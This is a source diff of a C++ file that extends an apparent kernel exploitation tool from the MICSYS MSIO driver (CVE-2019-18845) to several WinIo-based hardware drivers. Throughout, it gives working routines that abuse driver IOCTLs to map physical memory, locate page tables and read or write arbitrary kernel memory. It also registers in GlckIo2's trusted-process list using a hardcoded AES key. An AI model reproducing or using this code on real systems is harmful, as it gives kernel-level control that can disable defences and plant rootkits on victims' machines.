@@ -2,13 +2,13 @@
 *
 *  (C) COPYRIGHT AUTHORS, 2020
 *
-*  TITLE:       MSIO.CPP
+*  TITLE:       WINIO.CPP
 *
-*  VERSION:     1.00
+*  VERSION:     1.01
 *
-*  DATE:        07 Feb 2020
+*  DATE:        12 Feb 2020
 *
-*  MICSYS MSIO driver routines.
+*  WINIO based drivers routines.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -18,21 +18,50 @@
 *******************************************************************************/
 
 #include "global.h"
-#include "idrv/msio.h"
+#include "idrv/winio.h"
 
+#ifdef __cplusplus
+extern "C" {
+#include "tinyaes/aes.h"
+}
+#endif
+
+//
+// Generic WINIO interface for all supported drivers based on WINIO code.
 //
 // MICSYS RGB driver interface for CVE-2019-18845.
+// Ptolemy Tech Co., Ltd ENE driver interface
+// G.Skill EneIo64 driver interface
+// ... and multiple others
 //
 
+typedef PVOID(WINAPI* pfnWinIoGenericMapMemory)(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_ ULONG NumberOfBytes,
+    _Out_ HANDLE* SectionHandle,
+    _Out_ PVOID* ReferencedObject);
+
+typedef VOID(WINAPI* pfnWinIoGenericUnmapMemory)(
+    _In_ HANDLE DeviceHandle,
+    _In_ PVOID SectionToUnmap,
+    _In_ HANDLE SectionHandle,
+    _In_ PVOID ReferencedObject);
+
+
+pfnWinIoGenericMapMemory g_WinIoMapMemoryRoutine;
+pfnWinIoGenericUnmapMemory g_WinIoUnmapMemoryRoutine;
+BOOL g_PhysAddress64bit = FALSE;
+
 /*
-* MsioCallDriver
+* WinIoCallDriver
 *
 * Purpose:
 *
-* Call Patriot Msio driver.
+* Call WinIo driver.
 *
 */
-BOOL MsioCallDriver(
+BOOL WinIoCallDriver(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG IoControlCode,
     _In_ PVOID InputBuffer,
@@ -60,19 +89,19 @@ BOOL MsioCallDriver(
 }
 
 /*
-* MsioMapMemory
+* MsIoMapMemory
 *
 * Purpose:
 *
 * Map physical memory through \Device\PhysicalMemory.
 *
 */
-PVOID MsioMapMemory(
+PVOID MsIoMapMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
     _In_ ULONG NumberOfBytes,
-    _Out_ HANDLE *SectionHandle,
-    _Out_ PVOID *ReferencedObject)
+    _Out_ HANDLE* SectionHandle,
+    _Out_ PVOID* ReferencedObject)
 {
     MSIO_PHYSICAL_MEMORY_INFO request;
 
@@ -81,9 +110,9 @@ PVOID MsioMapMemory(
 
     RtlSecureZeroMemory(&request, sizeof(request));
     request.ViewSize = PhysicalAddress + NumberOfBytes;
-    
-    if (MsioCallDriver(DeviceHandle,
-        IOCTL_MSIO_MAP_USER_PHYSICAL_MEMORY,
+
+    if (WinIoCallDriver(DeviceHandle,
+        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
         &request,
         sizeof(request),
         &request,
@@ -98,14 +127,14 @@ PVOID MsioMapMemory(
 }
 
 /*
-* MsioUnmapMemory
+* MsIoUnmapMemory
 *
 * Purpose:
 *
 * Unmap previously mapped physical memory.
 *
 */
-VOID MsioUnmapMemory(
+VOID MsIoUnmapMemory(
     _In_ HANDLE DeviceHandle,
     _In_ PVOID SectionToUnmap,
     _In_ HANDLE SectionHandle,
@@ -119,8 +148,8 @@ VOID MsioUnmapMemory(
     request.ReferencedObject = ReferencedObject;
     request.SectionHandle = SectionHandle;
 
-    MsioCallDriver(DeviceHandle,
-        IOCTL_MSIO_UNMAP_USER_PHYSICAL_MEMORY,
+    WinIoCallDriver(DeviceHandle,
+        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
         &request,
         sizeof(request),
         &request,
@@ -128,14 +157,84 @@ VOID MsioUnmapMemory(
 }
 
 /*
-* MsioQueryPML4Value
+* WinIoMapMemory
+*
+* Purpose:
+*
+* Map physical memory through \Device\PhysicalMemory.
+*
+*/
+PVOID WinIoMapMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_ ULONG NumberOfBytes,
+    _Out_ HANDLE* SectionHandle,
+    _Out_ PVOID* ReferencedObject)
+{
+    WINIO_PHYSICAL_MEMORY_INFO request;
+
+    *SectionHandle = NULL;
+    *ReferencedObject = NULL;
+
+    RtlSecureZeroMemory(&request, sizeof(request));
+    request.ViewSize = NumberOfBytes;
+    request.BusAddress = PhysicalAddress;
+
+    if (WinIoCallDriver(DeviceHandle,
+        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
+        &request,
+        sizeof(request),
+        &request,
+        sizeof(request)))
+    {
+        *SectionHandle = request.SectionHandle;
+        *ReferencedObject = request.ReferencedObject;
+        return request.BaseAddress;
+    }
+
+    return NULL;
+}
+
+/*
+* WinIoUnmapMemory
+*
+* Purpose:
+*
+* Unmap previously mapped physical memory.
+*
+*/
+VOID WinIoUnmapMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ PVOID SectionToUnmap,
+    _In_ HANDLE SectionHandle,
+    _In_ PVOID ReferencedObject
+)
+{
+    WINIO_PHYSICAL_MEMORY_INFO request;
+
+    RtlSecureZeroMemory(&request, sizeof(request));
+    request.BaseAddress = SectionToUnmap;
+    request.ReferencedObject = ReferencedObject;
+    request.SectionHandle = SectionHandle;
+
+    WinIoCallDriver(DeviceHandle,
+        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
+        &request,
+        sizeof(request),
+        &request,
+        sizeof(request));
+}
+
+
+/*
+* WinIoQueryPML4Value
 *
 * Purpose:
 *
 * Locate PML4.
 *
 */
-BOOL WINAPI MsioQueryPML4Value(
+BOOL WINAPI WinIoQueryPML4Value(
     _In_ HANDLE DeviceHandle,
     _Out_ ULONG_PTR* Value)
 {
@@ -149,7 +248,7 @@ BOOL WINAPI MsioQueryPML4Value(
 
     do {
 
-        pbLowStub1M = (ULONG_PTR)MsioMapMemory(DeviceHandle,
+        pbLowStub1M = (ULONG_PTR)g_WinIoMapMemoryRoutine(DeviceHandle,
             0ULL,
             0x100000,
             &sectionHandle,
@@ -166,9 +265,9 @@ BOOL WINAPI MsioQueryPML4Value(
         else
             *Value = 0;
 
-        MsioUnmapMemory(DeviceHandle, 
-            (PVOID)pbLowStub1M, 
-            sectionHandle, 
+        g_WinIoUnmapMemoryRoutine(DeviceHandle,
+            (PVOID)pbLowStub1M,
+            sectionHandle,
             refObject);
 
         dwError = ERROR_SUCCESS;
@@ -180,14 +279,14 @@ BOOL WINAPI MsioQueryPML4Value(
 }
 
 /*
-* MsioReadWritePhysicalMemory
+* WinIoReadWritePhysicalMemory
 *
 * Purpose:
 *
 * Read/Write physical memory.
 *
 */
-BOOL WINAPI MsioReadWritePhysicalMemory(
+BOOL WINAPI WinIoReadWritePhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
     _In_ PVOID Buffer,
@@ -205,7 +304,7 @@ BOOL WINAPI MsioReadWritePhysicalMemory(
     //
     // Map physical memory section.
     //
-    mappedSection = MsioMapMemory(DeviceHandle,
+    mappedSection = g_WinIoMapMemoryRoutine(DeviceHandle,
         PhysicalAddress,
         NumberOfBytes,
         &sectionHandle,
@@ -218,10 +317,20 @@ BOOL WINAPI MsioReadWritePhysicalMemory(
         __try {
 
             if (DoWrite) {
-                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
+                if (g_PhysAddress64bit) {
+                    RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
+                }
+                else {
+                    RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
+                }
             }
             else {
-                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
+                if (g_PhysAddress64bit) {
+                    RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
+                }
+                else {
+                    RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
+                }
             }
 
             bResult = TRUE;
@@ -235,11 +344,11 @@ BOOL WINAPI MsioReadWritePhysicalMemory(
         //
         // Unmap physical memory section.
         //
-        MsioUnmapMemory(DeviceHandle,
+        g_WinIoUnmapMemoryRoutine(DeviceHandle,
             mappedSection,
             sectionHandle,
             refObject);
-        
+
     }
     else {
         dwError = GetLastError();
@@ -250,20 +359,20 @@ BOOL WINAPI MsioReadWritePhysicalMemory(
 }
 
 /*
-* MsioReadPhysicalMemory
+* WinIoReadPhysicalMemory
 *
 * Purpose:
 *
 * Read from physical memory.
 *
 */
-BOOL WINAPI MsioReadPhysicalMemory(
+BOOL WINAPI WinIoReadPhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
     _In_ PVOID Buffer,
     _In_ ULONG NumberOfBytes)
 {
-    return MsioReadWritePhysicalMemory(DeviceHandle,
+    return WinIoReadWritePhysicalMemory(DeviceHandle,
         PhysicalAddress,
         Buffer,
         NumberOfBytes,
@@ -271,20 +380,20 @@ BOOL WINAPI MsioReadPhysicalMemory(
 }
 
 /*
-* MsioWritePhysicalMemory
+* WinIoWritePhysicalMemory
 *
 * Purpose:
 *
 * Write to physical memory.
 *
 */
-BOOL WINAPI MsioWritePhysicalMemory(
+BOOL WINAPI WinIoWritePhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
     _In_ ULONG NumberOfBytes)
 {
-    return MsioReadWritePhysicalMemory(DeviceHandle,
+    return WinIoReadWritePhysicalMemory(DeviceHandle,
         PhysicalAddress,
         Buffer,
         NumberOfBytes,
@@ -292,14 +401,14 @@ BOOL WINAPI MsioWritePhysicalMemory(
 }
 
 /*
-* MsioVirtualToPhysical
+* WinIoVirtualToPhysical
 *
 * Purpose:
 *
 * Translate virtual address to the physical.
 *
 */
-BOOL WINAPI MsioVirtualToPhysical(
+BOOL WINAPI WinIoVirtualToPhysical(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR VirtualAddress,
     _Out_ ULONG_PTR* PhysicalAddress)
@@ -314,8 +423,8 @@ BOOL WINAPI MsioVirtualToPhysical(
     }
 
     bResult = PwVirtualToPhysical(DeviceHandle,
-        (provQueryPML4)MsioQueryPML4Value,
-        (provReadPhysicalMemory)MsioReadPhysicalMemory,
+        (provQueryPML4)WinIoQueryPML4Value,
+        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
         VirtualAddress,
         PhysicalAddress);
 
@@ -323,14 +432,14 @@ BOOL WINAPI MsioVirtualToPhysical(
 }
 
 /*
-* MsioReadKernelVirtualMemory
+* WinIoReadKernelVirtualMemory
 *
 * Purpose:
 *
-* Read virtual memory via MSIO.
+* Read virtual memory.
 *
 */
-BOOL WINAPI MsioReadKernelVirtualMemory(
+BOOL WINAPI WinIoReadKernelVirtualMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR Address,
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
@@ -340,13 +449,13 @@ BOOL WINAPI MsioReadKernelVirtualMemory(
     ULONG_PTR physicalAddress = 0;
     DWORD dwError = ERROR_SUCCESS;
 
-    bResult = MsioVirtualToPhysical(DeviceHandle,
+    bResult = WinIoVirtualToPhysical(DeviceHandle,
         Address,
         &physicalAddress);
 
     if (bResult) {
 
-        bResult = MsioReadWritePhysicalMemory(DeviceHandle,
+        bResult = WinIoReadWritePhysicalMemory(DeviceHandle,
             physicalAddress,
             Buffer,
             NumberOfBytes,
@@ -365,14 +474,14 @@ BOOL WINAPI MsioReadKernelVirtualMemory(
 }
 
 /*
-* MsioWriteKernelVirtualMemory
+* WinIoWriteKernelVirtualMemory
 *
 * Purpose:
 *
-* Write virtual memory via MSIO.
+* Write virtual memory.
 *
 */
-BOOL WINAPI MsioWriteKernelVirtualMemory(
+BOOL WINAPI WinIoWriteKernelVirtualMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR Address,
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
@@ -382,13 +491,13 @@ BOOL WINAPI MsioWriteKernelVirtualMemory(
     ULONG_PTR physicalAddress = 0;
     DWORD dwError = ERROR_SUCCESS;
 
-    bResult = MsioVirtualToPhysical(DeviceHandle,
+    bResult = WinIoVirtualToPhysical(DeviceHandle,
         Address,
         &physicalAddress);
 
     if (bResult) {
 
-        bResult = MsioReadWritePhysicalMemory(DeviceHandle,
+        bResult = WinIoReadWritePhysicalMemory(DeviceHandle,
             physicalAddress,
             Buffer,
             NumberOfBytes,
@@ -404,4 +513,79 @@ BOOL WINAPI MsioWriteKernelVirtualMemory(
 
     SetLastError(dwError);
     return bResult;
+}
+
+/*
+* GlckIo2Register
+*
+* Purpose:
+*
+* Register in GlckIo2 "trusted" process list.
+*
+*/
+BOOL GlckIo2Register(
+    _In_ HANDLE DeviceHandle)
+{
+    AES_ctx ctx;
+    ULONG_PTR encryptedProcessId;
+    UCHAR Buffer[16];
+    BYTE OutBuf[512];
+    ULONG AES128Key[4] = { 0x16157eaa, 0xa6d2ae28, 0x8815f7ab, 0x3c4fcf09 };
+
+    RtlSecureZeroMemory(&ctx, sizeof(ctx));
+
+    AES_init_ctx(&ctx, (uint8_t*)&AES128Key);
+
+    encryptedProcessId = SWAP_UINT32(GetCurrentProcessId());
+
+    RtlSecureZeroMemory(&Buffer, sizeof(Buffer));
+    RtlCopyMemory(&Buffer, &encryptedProcessId, sizeof(ULONG_PTR));
+    AES_ECB_encrypt(&ctx, (uint8_t*)&Buffer);
+
+    return WinIoCallDriver(DeviceHandle,
+        IOCTL_GKCKIO2_REGISTER,
+        &Buffer,
+        sizeof(Buffer),
+        &OutBuf,
+        sizeof(OutBuf));
+}
+
+/*
+* WinIoRegisterDriver
+*
+* Purpose:
+*
+* Register WinIo driver.
+*
+*/
+BOOL WINAPI WinIoRegisterDriver(
+    _In_ HANDLE DeviceHandle,
+    _In_opt_ PVOID Param)
+{ 
+    ULONG DriverId = PtrToUlong(Param);
+
+    switch (DriverId) {
+    case IDR_GLCKIO2:
+        g_WinIoMapMemoryRoutine = WinIoMapMemory;
+        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
+        g_PhysAddress64bit = TRUE;
+
+        if (!GlckIo2Register(DeviceHandle))
+            return FALSE;
+
+        break;
+
+    case IDR_MSIO64:
+        g_WinIoMapMemoryRoutine = MsIoMapMemory;
+        g_WinIoUnmapMemoryRoutine = MsIoUnmapMemory;
+        g_PhysAddress64bit = FALSE;
+        break;
+    default:
+        g_WinIoMapMemoryRoutine = WinIoMapMemory;
+        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
+        g_PhysAddress64bit = TRUE;
+        break;
+    }
+
+    return TRUE;
 }
